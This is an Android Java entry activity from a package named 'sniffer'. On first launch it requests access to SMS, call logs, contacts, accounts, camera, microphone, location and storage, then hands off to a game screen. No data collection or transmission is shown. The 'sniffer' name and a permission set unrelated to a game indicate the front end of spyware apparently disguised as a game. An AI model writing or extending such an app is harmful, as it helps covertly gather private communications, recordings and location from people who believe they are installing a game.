package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import com.v8.global.sniffer.game.MainGameActivity;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 7777;
    private SharedPreferences prefs;
    private boolean isFirstRun;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // تهيئة SharedPreferences
        prefs = getSharedPreferences("my_app_prefs", MODE_PRIVATE);
        isFirstRun = prefs.getBoolean("first_run", true);
        
        // التحقق من الصلاحيات
        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        // إذا كانت هذه أول مرة
        if (isFirstRun) {
            // اطلب الصلاحيات
            requestAllPermissions();
            return;
        }
        
        // ليس أول مرة - افتح اللعبة مباشرة
        openGame();
    }

    private void requestAllPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // قائمة الصلاحيات
        String[] permissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        };

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(perm);
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            // طلب الصلاحيات
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // كل الصلاحيات موجودة
            onAllPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            // سجل أن المستخدم شاهد طلب الصلاحيات
            prefs.edit().putBoolean("first_run", false).apply();
            
            // افتح اللعبة بعد ثانية
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    openGame();
                }
            }, 1000);
        }
    }

    private void onAllPermissionsGranted() {
        // سجل أن المستخدم أكمل الصلاحيات
        prefs.edit().putBoolean("first_run", false).apply();
        openGame();
    }

    private void openGame() {
        Intent intent = new Intent(this, MainGameActivity.class);
        startActivity(intent);
        finish();
    }
}
